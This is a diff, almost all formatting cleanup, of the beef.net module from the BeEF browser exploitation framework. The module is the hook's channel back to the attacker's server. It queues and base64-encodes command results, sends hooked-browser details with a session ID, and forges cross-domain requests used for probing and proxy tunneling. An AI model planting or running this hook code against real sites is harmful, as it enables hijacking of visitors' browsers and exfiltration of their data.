@@ -18,21 +18,21 @@
  */
 beef.net = {
 
-    host:"<%= @beef_host %>",
-    port:"<%= @beef_port %>",
-    hook:"<%= @beef_hook %>",
-    httpproto:"<%= @beef_proto %>",
-    handler:'/dh',
-    chop:500,
-    pad:30, //this is the amount of padding for extra params such as pc, pid and sid
-    sid_count:0,
-    cmd_queue:[],
+    host: "<%= @beef_host %>",
+    port: "<%= @beef_port %>",
+    hook: "<%= @beef_hook %>",
+    httpproto: "<%= @beef_proto %>",
+    handler: '/dh',
+    chop: 500,
+    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
+    sid_count: 0,
+    cmd_queue: [],
 
     /**
      * Command object. This represents the data to be sent back to BeEF,
      * using the beef.net.send() method.
      */
-    command:function () {
+    command: function () {
         this.cid = null;
         this.results = null;
         this.handler = null;
@@ -42,7 +42,7 @@ beef.net = {
     /**
      * Packet object. A single chunk of data. X packets -> 1 stream
      */
-    packet:function () {
+    packet: function () {
         this.id = null;
         this.data = null;
     },
@@ -50,7 +50,7 @@ beef.net = {
     /**
      * Stream object. Contains X packets, which are command result chunks.
      */
-    stream:function () {
+    stream: function () {
         this.id = null;
         this.packets = [];
         this.pc = 0;
@@ -58,8 +58,8 @@ beef.net = {
             return (this.url + this.handler + '?' + 'bh=' + beef.session.get_hook_session_id()).length;
         };
         this.get_packet_data = function () {
-             var p = this.packets.shift();
-             return {'bh':beef.session.get_hook_session_id(), 'sid':this.id, 'pid':p.id, 'pc':this.pc, 'd':p.data }
+            var p = this.packets.shift();
+            return {'bh': beef.session.get_hook_session_id(), 'sid': this.id, 'pid': p.id, 'pc': this.pc, 'd': p.data }
         };
     },
 
@@ -68,7 +68,7 @@ beef.net = {
      * NOTE: as we are using async mode, the response object will be empty if returned.
      * Using sync mode, request obj fields will be populated.
      */
-    response:function () {
+    response: function () {
         this.status_code = null;        // 500, 404, 200, 302
         this.status_text = null;        // success, timeout, error, ...
         this.response_body = null;      // "<html>…." if not a cross domain request
@@ -86,7 +86,7 @@ beef.net = {
      * @param: {String} results: the data to send
      * @param: {Function} callback: the function to call after execution
      */
-    queue:function (handler, cid, results, callback) {
+    queue: function (handler, cid, results, callback) {
         if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
             var s = new beef.net.command();
             s.cid = cid;
@@ -107,16 +107,16 @@ beef.net = {
      * @param: {String} results: the data to send
      * @param: {Function} callback: the function to call after execution
      */
-    send:function (handler, cid, results, callback) {
+    send: function (handler, cid, results, callback) {
         if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
             this.queue(handler, cid, results, callback);
             this.flush();
-        }else {
+        } else {
             try {
                 beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid +
                     '", "result":"' + beef.encode.base64.encode(beef.encode.json.stringify(results)) +
                     '","callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
-            }catch (e) {
+            } catch (e) {
                 this.queue(handler, cid, results, callback);
                 this.flush();
             }
@@ -131,7 +131,7 @@ beef.net = {
      * XHR-polling mechanism. If WebSockets are used, the data is sent
      * back to BeEF straight away.
      */
-    flush:function () {
+    flush: function () {
         if (this.cmd_queue.length > 0) {
             var data = beef.encode.base64.encode(beef.encode.json.stringify(this.cmd_queue));
             this.cmd_queue.length = 0;
@@ -159,7 +159,7 @@ beef.net = {
      * @param: {String} str: the input data
      * @param: {Integer} amount: chunk length
      */
-    chunk:function (str, amount) {
+    chunk: function (str, amount) {
         if (typeof amount == 'undefined') n = 2;
         return str.match(RegExp('.{1,' + amount + '}', 'g'));
     },
@@ -169,7 +169,7 @@ beef.net = {
      * It uses beef.net.request to send back the data.
      * @param: {Object} stream: the stream object to be sent back.
      */
-    push:function (stream) {
+    push: function (stream) {
         //need to implement wait feature here eventually
         for (var i = 0; i < stream.pc; i++) {
             this.request(this.httpproto, 'GET', this.host, this.port, this.handler, null, stream.get_packet_data(), 10, 'text', null);
@@ -191,11 +191,11 @@ beef.net = {
      *
      * @return: {Object} response: this object contains the response details
      */
-    request:function (scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
+    request: function (scheme, method, domain, port, path, anchor, data, timeout, dataType, callback) {
         //check if same domain or cross domain
         var cross_domain = true;
-		if (document.domain == domain.replace(/(\r\n|\n|\r)/gm,"")) { //strip eventual line breaks
-            if(document.location.port == "" || document.location.port == null){
+        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm, "")) { //strip eventual line breaks
+            if (document.location.port == "" || document.location.port == null) {
                 cross_domain = !(port == "80" || port == "443");
             }
         }
@@ -220,29 +220,29 @@ beef.net = {
          * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
          * This will turn POSTs into GETs for remote-domain requests.
          */
-        if (method == "POST"){
-           $j.ajaxSetup({
-              dataType: dataType
-           });
+        if (method == "POST") {
+            $j.ajaxSetup({
+                dataType: dataType
+            });
         } else {
-           $j.ajaxSetup({
+            $j.ajaxSetup({
                 dataType: 'script'
-           });
+            });
         }
 
         //build and execute the request
-        $j.ajax({type:method,
-            url:url,
-            data:data,
-            timeout:(timeout * 1000),
+        $j.ajax({type: method,
+            url: url,
+            data: data,
+            timeout: (timeout * 1000),
 
             //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
-            beforeSend:function (xhr) {
+            beforeSend: function (xhr) {
                 if (method == "POST") {
                     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                 }
             },
-            success:function (data, textStatus, xhr) {
+            success: function (data, textStatus, xhr) {
                 var end_time = new Date().getTime();
                 response.status_code = xhr.status;
                 response.status_text = textStatus;
@@ -251,14 +251,14 @@ beef.net = {
                 response.was_timedout = false;
                 response.duration = (end_time - start_time);
             },
-            error:function (jqXHR, textStatus, errorThrown) {
+            error: function (jqXHR, textStatus, errorThrown) {
                 var end_time = new Date().getTime();
                 response.response_body = jqXHR.responseText;
                 response.status_code = jqXHR.status;
                 response.status_text = textStatus;
                 response.duration = (end_time - start_time);
             },
-            complete:function (jqXHR, textStatus) {
+            complete: function (jqXHR, textStatus) {
                 response.status_code = jqXHR.status;
                 response.status_text = textStatus;
                 response.headers = jqXHR.getAllResponseHeaders();
@@ -288,19 +288,19 @@ beef.net = {
      *
      * forge_request is used mainly by the Requester and Tunneling Proxy Extensions.
      */
-    forge_request:function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {
+    forge_request: function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {
 
         // check if same domain or cross domain
         var cross_domain = true;
-        if(domain == "undefined" || path == "undefined"){
+        if (domain == "undefined" || path == "undefined") {
             return;
         }
-        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm,"")) { //strip eventual line breaks
-           if(document.location.port == "" || document.location.port == null){
-               cross_domain = !(port == "80" || port == "443");
-           } else {
-              if (document.location.port == port) cross_domain = false;
-           }
+        if (document.domain == domain.replace(/(\r\n|\n|\r)/gm, "")) { //strip eventual line breaks
+            if (document.location.port == "" || document.location.port == null) {
+                cross_domain = !(port == "80" || port == "443");
+            } else {
+                if (document.location.port == port) cross_domain = false;
+            }
         }
         // build the url
         var url = "";
@@ -334,7 +334,7 @@ beef.net = {
          * according to http://api.jquery.com/jQuery.ajax/, Note: having 'script':
          * This will turn POSTs into GETs for remote-domain requests.
          */
-        if (method == "POST"){
+        if (method == "POST") {
             $j.ajaxSetup({
                 dataType: dataType
             });
@@ -344,8 +344,8 @@ beef.net = {
             });
         }
 
-		// this is required for bugs in IE so data can be transferred back to the server
-        if ( beef.browser.isIE() ) {
+        // this is required for bugs in IE so data can be transferred back to the server
+        if (beef.browser.isIE()) {
             dataType = 'script'
         }
 
@@ -356,14 +356,14 @@ beef.net = {
             timeout: (timeout * 1000),
 
             //This is needed, otherwise jQuery always add Content-type: application/xml, even if data is populated.
-            beforeSend:function (xhr) {
+            beforeSend: function (xhr) {
                 if (method == "POST") {
                     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded; charset=utf-8");
                 }
             },
 
             // http server responded successfully
-            success:function (data, textStatus, xhr) {
+            success: function (data, textStatus, xhr) {
                 var end_time = new Date().getTime();
                 response.status_code = xhr.status;
                 response.status_text = textStatus;
@@ -374,7 +374,7 @@ beef.net = {
 
             // server responded with a http error (403, 404, 500, etc)
             // or server is not a http server
-            error:function (xhr, textStatus, errorThrown) {
+            error: function (xhr, textStatus, errorThrown) {
                 var end_time = new Date().getTime();
                 response.response_body = xhr.responseText;
                 response.status_code = xhr.status;
@@ -382,33 +382,33 @@ beef.net = {
                 response.duration = (end_time - start_time);
             },
 
-            complete:function (xhr, textStatus) {
+            complete: function (xhr, textStatus) {
                 // cross-domain request
                 if (cross_domain) {
 
-					response.port_status = "crossdomain";
+                    response.port_status = "crossdomain";
 
                     if (xhr.status != 0) {
-						response.status_code = xhr.status;
-					} else {
-						response.status_code = -1;
-					}
+                        response.status_code = xhr.status;
+                    } else {
+                        response.status_code = -1;
+                    }
 
-					if (textStatus) {
-                    	response.status_text = textStatus;
-					} else {
-						response.status_text = "crossdomain";
-					}
+                    if (textStatus) {
+                        response.status_text = textStatus;
+                    } else {
+                        response.status_text = "crossdomain";
+                    }
 
-					if (xhr.getAllResponseHeaders()) {
-	                    response.headers = xhr.getAllResponseHeaders();
-					} else {
-						response.headers = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
-					}
+                    if (xhr.getAllResponseHeaders()) {
+                        response.headers = xhr.getAllResponseHeaders();
+                    } else {
+                        response.headers = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
+                    }
 
-					if (!response.response_body) {
-						response.response_body = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
-					}
+                    if (!response.response_body) {
+                        response.response_body = "ERROR: Cross Domain Request. The request was sent however it is impossible to view the response.\n";
+                    }
 
                 } else {
                     // same-domain request
@@ -421,12 +421,16 @@ beef.net = {
                         response.was_timedout = true;
                         response.response_body = "ERROR: Timed out\n";
                         response.port_status = "closed";
-                    /*
-                    * With IE we need to explicitely sey the dataType to "script",
-                    * so there will be always parse-errors if the content is != javascript
-                    * */
-                    } else if (textStatus == "parsererror" && !beef.browser.isIE()) {
+                        /*
+                         * With IE we need to explicitly set the dataType to "script",
+                         * so there will be always parse-errors if the content is != javascript
+                         * */
+                    } else if (textStatus == "parsererror") {
                         response.port_status = "not-http";
+                        if (beef.browser.isIE()) {
+                            response.status_text = "success";
+                            response.port_status = "open";
+                        }
                     } else {
                         response.port_status = "open";
                     }
@@ -439,7 +443,7 @@ beef.net = {
 
     //this is a stub, as associative arrays are not parsed by JSON, all key / value pairs should use new Object() or {}
     //http://andrewdupont.net/2006/05/18/javascript-associative-arrays-considered-harmful/
-    clean:function (r) {
+    clean: function (r) {
         if (this.array_has_string_key(r)) {
             var obj = {};
             for (var key in r)
@@ -450,7 +454,7 @@ beef.net = {
     },
 
     //Detects if an array has a string key
-    array_has_string_key:function (arr) {
+    array_has_string_key: function (arr) {
         if ($j.isArray(arr)) {
             try {
                 for (var key in arr)
@@ -464,7 +468,7 @@ beef.net = {
     /**
      * Sends back browser details to framework, calling beef.browser.getDetails()
      */
-    browser_details:function () {
+    browser_details: function () {
         var details = beef.browser.getDetails();
         details['HookSessionID'] = beef.session.get_hook_session_id();
         this.send('/init', 0, details);
